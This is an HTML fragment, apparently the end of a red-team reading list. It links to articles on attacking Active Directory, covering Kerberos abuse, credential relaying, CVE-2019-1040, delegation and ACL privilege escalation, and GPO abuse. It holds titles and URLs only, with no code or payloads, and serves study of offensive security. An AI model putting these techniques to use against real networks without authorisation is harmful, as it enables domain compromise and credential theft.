Toscher</a></li></ul><ul id="f4641b99-85d9-4eed-ad4b-29525711349e" class="bulleted-list"><li><a href="https://hausec.com/2017/10/26/using-bloodhound-to-map-the-user-network/">Using bloodhound to map the user network - Hausec</a></li></ul><ul id="e94efbef-0320-4369-bfc8-da9ede5f204a" class="bulleted-list"><li><a href="https://morgansimonsen.com/2012/05/21/whats-special-about-the-builtin-administrator-account-12/">WHAT‚ÄôS SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN</a></li></ul><ul id="3ff79e4e-66fd-4d0a-9cbb-af36526186b8" class="bulleted-list"><li><a href="https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/">WONKACHALL AKERVA NDH2018 ‚Äì WRITE UP PART 1</a></li></ul><ul id="806f309b-797e-4cd9-92a0-f2b193ea3d14" class="bulleted-list"><li><a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/">WONKACHALL AKERVA NDH2018 ‚Äì WRITE UP PART 2</a></li></ul><ul id="625902f0-b26e-42d2-9906-d77b94b4355b" class="bulleted-list"><li><a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/">WONKACHALL AKERVA NDH2018 ‚Äì WRITE UP PART 3</a></li></ul><ul id="4ca0167d-aded-40de-9d49-852bd54a7077" class="bulleted-list"><li><a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/">WONKACHALL AKERVA NDH2018 ‚Äì WRITE UP PART 4</a></li></ul><ul id="b2c326a7-6688-4bea-94d9-bf09f953692d" class="bulleted-list"><li><a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/">WONKACHALL AKERVA NDH2018 ‚Äì WRITE UP PART 5</a></li></ul><ul id="3ef995fc-b535-4600-adc0-c93cfd0494a7" class="bulleted-list"><li><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami</a></li></ul><ul id="96968899-dbce-4efa-bc2c-7b0d30deffb9" class="bulleted-list"><li><a href="http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/">[PrivExchange] From user to domain admin in less than 60sec ! - davy</a></li></ul><ul id="076d5631-6fe7-4d93-b130-f3d60cfd3703" class="bulleted-list"><li><a href="http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y</a></li></ul><ul id="6a18682f-8166-472f-9363-0af32aa38fea" class="bulleted-list"><li><a href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/">Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY P√âREZ</a></li></ul><ul id="c9e987a9-e985-4c1b-9df4-48a2e99e650b" class="bulleted-list"><li><a href="https://adsecurity.org/?p=3592">Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf</a></li></ul><ul id="783fb2ae-6b3e-4df3-be82-1b234713cd80" class="bulleted-list"><li><a href="https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/">All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018</a></li></ul><ul id="2744563f-fc71-4c29-8c0d-51bf7e904f93" class="bulleted-list"><li><a href="https://www.blackhat.com/presentations/bh-europe-09/Bouillon/BlackHat-Europe-09-Bouillon-Taming-the-Beast-Kerberous-slides.pdf">Taming the Beast Assess Kerberos-Protected Networks - Emmanuel Bouillon</a></li></ul><ul id="53e8bc28-3ae7-4d74-8ea9-2beea2495abc" class="bulleted-list"><li><a href="https://www.secureauth.com/blog/playing-relayed-credentials">Playing with Relayed Credentials - June 27, 2018</a></li></ul><ul id="8a62ad6e-f6fb-448c-b49e-9d5a0bbb8089" class="bulleted-list"><li><a href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/">Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema</a></li></ul><ul id="08f948e9-491d-491f-9d8a-a6b1d6757a31" class="bulleted-list"><li><a href="https://blog.preempt.com/drop-the-mic">Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019</a></li></ul><ul id="2f6425cf-54ad-4a39-85dd-157d3e718ad0" class="bulleted-list"><li><a href="https://www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/">How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous</a></li></ul><ul id="2e4bd9bd-2ec5-4f4e-b8e9-984644511300" class="bulleted-list"><li><a href="file:///C:/hackz/PayloadsAllTheThings-master/PayloadsAllTheThings-master/Methodology%20and%20Resources/pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">SMB Share ‚Äì SCF File Attacks - December 13, 2017 - @netbiosX</a></li></ul><ul id="b2cc657c-5efd-46d7-b703-514eb31834ce" class="bulleted-list"><li><a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema</a></li></ul><ul id="059d2b5c-57d1-4fe6-a06e-30d0e77b1d81" class="bulleted-list"><li><a href="https://wald0.com/?p=179">A Red Teamer‚Äôs Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0</a></li></ul><ul id="75ae5226-a861-4dca-a34c-09109d443f6b" class="bulleted-list"><li><a href="https://www.dropbox.com/s/ilzjtlo0vbyu1u0/Carlos%20Garcia%20-%20Rooted2019%20-%20Pentesting%20Active%20Directory%20Forests%20public.pdf?dl=0">Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf</a></li></ul></div></article></body></html>